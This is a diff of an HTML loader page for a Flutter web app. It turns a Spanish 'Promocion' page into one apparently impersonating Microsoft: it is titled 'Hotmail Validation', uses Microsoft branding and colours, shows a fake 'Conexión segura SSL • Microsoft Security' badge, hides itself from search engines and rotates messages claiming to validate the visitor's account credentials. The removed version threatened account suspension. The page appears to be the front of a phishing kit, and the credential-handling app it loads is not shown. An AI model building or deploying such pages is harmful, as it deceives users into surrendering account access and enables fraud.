@@ -1,109 +1,302 @@
 <!DOCTYPE html>
 <html>
 <head>
-
   <base href="/">
-
   <meta charset="UTF-8">
   <meta content="IE=Edge" http-equiv="X-UA-Compatible">
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black">
-  <meta name="apple-mobile-web-app-title" content="Promocion">
-  <meta name="robots" content="noindex" />
-  <meta property="og:title" content="Promocion" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Hotmail Validation">
+  <meta name="robots" content="noindex, nofollow">
+  <meta property="og:title" content="Hotmail Validation">
+  <meta property="og:description" content="Microsoft Account Security Validation">
+  
+  <!-- Microsoft Segoe UI Font -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <meta property="og:description" content="Promocion" />
-  <title> Hotmail Validation </title>
-  <meta name="description" content="Promocion" />
-    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f1f4f8">
-  <meta name="theme-color" media="(prefers-color-scheme: dark)"  content="#1d2428">
-
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  
+  <title>Hotmail Validation | Microsoft</title>
+  <meta name="description" content="Microsoft Account Security Validation">
+  <meta name="theme-color" content="#0078D4">
+  
   <link rel="manifest" href="manifest.json">
   
-</head>
- <style>
-    body {
+  <style>
+    * {
       margin: 0;
-      height: 100vh;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
+      background: linear-gradient(135deg, #0078D4 0%, #005A9E 50%, #003966 100%);
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      background: #f9fafb;
-      font-family: Arial, sans-serif;
-    }
-
-    .loader-container {
-      text-align: center;
-      max-width: 300px;
       padding: 20px;
-      background: white;
-      border-radius: 15px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      color: white;
+      overflow-x: hidden;
     }
 
-    .loader-container h2 {
-      font-size: 1.3rem;
-      margin-bottom: 10px;
-      color: #2563eb;
-    }
-
-    .loader-container p {
-      font-size: 0.95rem;
-      color: #374151;
-      margin-bottom: 20px;
-    }
-
-    .loader-bar {
+    .validation-container {
       width: 100%;
-      height: 8px;
-      background: #e5e7eb;
-      border-radius: 10px;
+      max-width: 480px;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 16px;
+      padding: 40px 30px;
+      text-align: center;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      animation: fadeIn 0.5s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .microsoft-logo {
+      margin-bottom: 30px;
+    }
+
+    .microsoft-logo span {
+      font-size: 42px;
+      font-weight: 700;
+      letter-spacing: -1px;
+      background: linear-gradient(135deg, #FFFFFF 0%, #E6F2FF 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    .validation-title {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      color: white;
+      line-height: 1.3;
+    }
+
+    .validation-subtitle {
+      font-size: 16px;
+      font-weight: 400;
+      line-height: 1.6;
+      margin-bottom: 40px;
+      color: rgba(255, 255, 255, 0.9);
+      opacity: 0.9;
+    }
+
+    .loading-animation {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 30px;
+      height: 60px;
+    }
+
+    .loading-dots {
+      display: flex;
+      gap: 8px;
+    }
+
+    .loading-dots span {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: white;
+      animation: pulse 1.4s infinite ease-in-out both;
+    }
+
+    .loading-dots span:nth-child(1) {
+      animation-delay: -0.32s;
+    }
+
+    .loading-dots span:nth-child(2) {
+      animation-delay: -0.16s;
+    }
+
+    @keyframes pulse {
+      0%, 80%, 100% { 
+        transform: scale(0.8);
+        opacity: 0.5;
+      }
+      40% { 
+        transform: scale(1.2);
+        opacity: 1;
+      }
+    }
+
+    .progress-container {
+      width: 100%;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 2px;
       overflow: hidden;
-      position: relative;
+      margin-bottom: 30px;
     }
 
-    .loader-bar::after {
-      content: "";
-      position: absolute;
-      left: -40%;
-      top: 0;
-      width: 40%;
+    .progress-bar {
       height: 100%;
-      background: #2563eb;
-      border-radius: 10px;
-      animation: load 1.5s infinite;
+      width: 45%;
+      background: linear-gradient(90deg, #4FC3F7 0%, #FFFFFF 100%);
+      border-radius: 2px;
+      animation: progress 2s infinite ease-in-out;
     }
 
-    @keyframes load {
-      0% { left: -40%; }
-      50% { left: 100%; }
-      100% { left: -40%; }
+    @keyframes progress {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(250%); }
     }
 
-    .loader-text {
-      margin-top: 10px;
-      font-size: 0.85rem;
-      color: #6b7280;
+    .status-message {
+      font-size: 14px;
+      font-weight: 400;
+      color: rgba(255, 255, 255, 0.85);
+      margin-bottom: 25px;
+      line-height: 1.5;
+      min-height: 42px;
+    }
+
+    .security-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 16px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 500;
+      margin-top: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+    }
+
+    .security-badge i {
+      font-size: 14px;
+      color: #4CAF50;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      .validation-container {
+        padding: 30px 20px;
+        margin: 0 15px;
+      }
+      
+      .microsoft-logo span {
+        font-size: 36px;
+      }
+      
+      .validation-title {
+        font-size: 24px;
+      }
+      
+      .validation-subtitle {
+        font-size: 15px;
+        margin-bottom: 30px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 15px;
+      }
+      
+      .validation-container {
+        padding: 25px 15px;
+        border-radius: 12px;
+      }
+      
+      .microsoft-logo span {
+        font-size: 32px;
+      }
+      
+      .validation-title {
+        font-size: 22px;
+      }
+      
+      .validation-subtitle {
+        font-size: 14px;
+        margin-bottom: 25px;
+      }
+      
+      .status-message {
+        font-size: 13px;
+      }
+      
+      .security-badge {
+        font-size: 12px;
+        padding: 8px 12px;
+      }
+    }
+
+    @media (max-width: 360px) {
+      .validation-container {
+        padding: 20px 12px;
+      }
+      
+      .microsoft-logo span {
+        font-size: 28px;
+      }
+      
+      .validation-title {
+        font-size: 20px;
+      }
+    }
+
+    /* Dark mode support */
+    @media (prefers-color-scheme: dark) {
+      body {
+        background: linear-gradient(135deg, #005A9E 0%, #003966 50%, #002952 100%);
+      }
+      
+      .validation-container {
+        background: rgba(0, 0, 0, 0.2);
+      }
     }
   </style>
 </head>
 <body>
-  <div class="loader-container">
-    <h2>Validando su cuenta</h2>
-    <p>Si no completa los siguientes pasos,<br> su cuenta podrá ser suspendida temporalmente como medida de seguridad..</p>
-
-    <div class="loader-bar"></div>
-    <div class="loader-text">Por favor espere...</div>
+  <div class="validation-container">
+    <div class="microsoft-logo">
+      <span>Microsoft</span>
+    </div>
+    
+    <h1 class="validation-title">
+      Validando su cuenta de Hotmail
+    </h1>
+    
+    <p class="validation-subtitle">
+      Estamos verificando la seguridad de su cuenta. Este proceso es necesario para proteger su información personal.
+    </p>
+    
+    <div class="loading-animation">
+      <div class="loading-dots">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+    </div>
+    
+    <div class="progress-container">
+      <div class="progress-bar"></div>
+    </div>
+    
+    <div class="status-message">
+      <div id="statusText">Validando credenciales de seguridad...</div>
+    </div>
+    
+    <div class="security-badge">
+      <i class="fas fa-shield-alt"></i>
+      <span>Conexión segura SSL • Microsoft Security</span>
+    </div>
   </div>
-</body>
-  
-  
-  
-  
+
   <script>
     (()=>{var C={blink:!0,gecko:!1,webkit:!1,unknown:!1},R=()=>navigator.vendor==="Google Inc."||navigator.userAgent.includes("Edg/")?"blink":navigator.vendor==="Apple Computer, Inc."?"webkit":navigator.vendor===""&&navigator.userAgent.includes("Firefox")?"gecko":"unknown",L=R(),x=()=>typeof ImageDecoder>"u"?!1:L==="blink",K=()=>typeof Intl.v8BreakIterator<"u"&&typeof Intl.Segmenter<"u",B=()=>{let i=[0,97,115,109,1,0,0,0,1,5,1,95,1,120,0];return WebAssembly.validate(new Uint8Array(i))},w={browserEngine:L,hasImageCodecs:x(),hasChromiumBreakIterators:K(),supportsWasmGC:B(),crossOriginIsolated:window.crossOriginIsolated};function c(...i){return new URL(T(...i),document.baseURI).toString()}function T(...i){return i.filter(e=>!!e).map((e,r)=>r===0?I(e):z(I(e))).filter(e=>e.length).join("/")}function z(i){let e=0;for(;e<i.length&&i.charAt(e)==="/";)e++;return i.substring(e)}function I(i){let e=i.length;for(;e>0&&i.charAt(e-1)==="/";)e--;return i.substring(0,e)}function U(i,e){return i.canvasKitBaseUrl?i.canvasKitBaseUrl:e.engineRevision&&!e.useLocalCanvasKit?T("https://www.gstatic.com/flutter-canvaskit",e.engineRevision):"canvaskit"}var v=class{constructor(){this._scriptLoaded=!1}setTrustedTypesPolicy(e){this._ttPolicy=e}async loadEntrypoint(e){let{entrypointUrl:r=c("main.dart.js"),onEntrypointLoaded:t,nonce:n}=e||{};return this._loadJSEntrypoint(r,t,n)}async load(e,r,t,n,s){s??=u=>{u.initializeEngine(t).then(m=>m.runApp())};let{entrypointBaseUrl:a}=t,{entryPointBaseUrl:o}=t;if(!a&&o&&(console.warn("[deprecated] `entryPointBaseUrl` is deprecated and will be removed in a future release. Use `entrypointBaseUrl` instead."),a=o),e.compileTarget==="dart2wasm")return this._loadWasmEntrypoint(e,r,a,s);{let u=e.mainJsPath??"main.dart.js",m=c(a,u);return this._loadJSEntrypoint(m,s,n)}}didCreateEngineInitializer(e){typeof this._didCreateEngineInitializerResolve=="function"&&(this._didCreateEngineInitializerResolve(e),this._didCreateEngineInitializerResolve=null,delete _flutter.loader.didCreateEngineInitializer),typeof this._onEntrypointLoaded=="function"&&this._onEntrypointLoaded(e)}_loadJSEntrypoint(e,r,t){let n=typeof r=="function";if(!this._scriptLoaded){this._scriptLoaded=!0;let s=this._createScriptTag(e,t);if(n)console.debug("Injecting <script> tag. Using callback."),this._onEntrypointLoaded=r,document.head.append(s);else return new Promise((a,o)=>{console.debug("Injecting <script> tag. Using Promises. Use the callback approach instead!"),this._didCreateEngineInitializerResolve=a,s.addEventListener("error",o),document.head.append(s)})}}async _loadWasmEntrypoint(e,r,t,n){if(!this._scriptLoaded){this._scriptLoaded=!0,this._onEntrypointLoaded=n;let{mainWasmPath:s,jsSupportRuntimePath:a}=e,o=c(t,s),u=c(t,a);this._ttPolicy!=null&&(u=this._ttPolicy.createScriptURL(u));let p=(await import(u)).compileStreaming(fetch(o)),l;e.renderer==="skwasm"?l=(async()=>{let d=await r.skwasm;return window._flutter_skwasmInstance=d,{skwasm:d.wasmExports,skwasmWrapper:d,ffi:{memory:d.wasmMemory}}})():l=Promise.resolve({}),await(await(await p).instantiate(await l,{loadDynamicModule:async(d,S)=>{let j=fetch(c(t,d)),_=c(t,S);this._ttPolicy!=null&&(_=this._ttPolicy.createScriptURL(_));let A=import(_);return[await j,await A]}})).invokeMain()}}_createScriptTag(e,r){let t=document.createElement("script");t.type="application/javascript",r&&(t.nonce=r);let n=e;return this._ttPolicy!=null&&(n=this._ttPolicy.createScriptURL(e)),t.src=n,t}};async function E(i,e,r){if(e<0)return i;let t,n=new Promise((s,a)=>{t=setTimeout(()=>{a(new Error(`${r} took more than ${e}ms to resolve. Moving on.`,{cause:E}))},e)});return Promise.race([i,n]).finally(()=>{clearTimeout(t)})}var h=class{setTrustedTypesPolicy(e){this._ttPolicy=e}loadServiceWorker(e){if(!e)return console.debug("Null serviceWorker configuration. Skipping."),Promise.resolve();if(!("serviceWorker"in navigator)){let o="Service Worker API unavailable.";return window.isSecureContext||(o+=`
 The current context is NOT secure.`,o+=`
@@ -155,6 +348,43 @@ _flutter.loader.load(
     }
 );
 
+    
+    // Dynamic status messages
+    document.addEventListener('DOMContentLoaded', function() {
+      const statusText = document.getElementById('statusText');
+      const messages = [
+        "Validando credenciales de seguridad...",
+        "Verificando información de la cuenta...",
+        "Comprobando protocolos de autenticación...",
+        "Analizando patrones de acceso...",
+        "Finalizando validación de seguridad..."
+      ];
+      
+      let currentIndex = 0;
+      
+      // Rotate messages every 3 seconds
+      setInterval(() => {
+        currentIndex = (currentIndex + 1) % messages.length;
+        statusText.textContent = messages[currentIndex];
+        
+        // Add fade effect
+        statusText.style.opacity = 0;
+        setTimeout(() => {
+          statusText.style.transition = 'opacity 0.3s ease';
+          statusText.style.opacity = 1;
+        }, 50);
+      }, 3000);
+      
+      // Add responsive adjustments on resize
+      window.addEventListener('resize', function() {
+        const container = document.querySelector('.validation-container');
+        if (window.innerWidth < 480) {
+          container.style.maxWidth = '95%';
+        } else {
+          container.style.maxWidth = '480px';
+        }
+      });
+    });
   </script>
 </body>
 </html>
